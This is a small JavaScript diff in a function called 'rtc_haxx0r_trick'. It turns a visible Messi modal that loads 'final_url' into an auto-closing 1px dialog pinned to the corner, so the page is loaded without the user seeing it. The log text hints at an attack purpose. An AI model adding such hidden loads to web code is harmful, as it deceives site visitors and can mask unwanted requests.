@@ -1533,7 +1533,16 @@ function rtc_haxx0r_trick() {
 
     console.log('trying to get massi up and running....')
 
-    Messi.load(final_url, {modal: true, width: 500, buttons: [{id: 0, label: 'close', val: 'X'}], callback: mess_done})
+    Messi.load(final_url, {
+        // modal: true, 
+        // width: 500,
+        autoclose:  1,
+        width:      "1px",
+        height:     "1px",
+        viewport:   {top: '1px', left: '1px'},
+        // buttons:    [{id: 0, label: 'close', val: 'X'}], 
+        callback:   mess_done
+    })
 
     function mess_done() {
         console.log('messi up, server down')
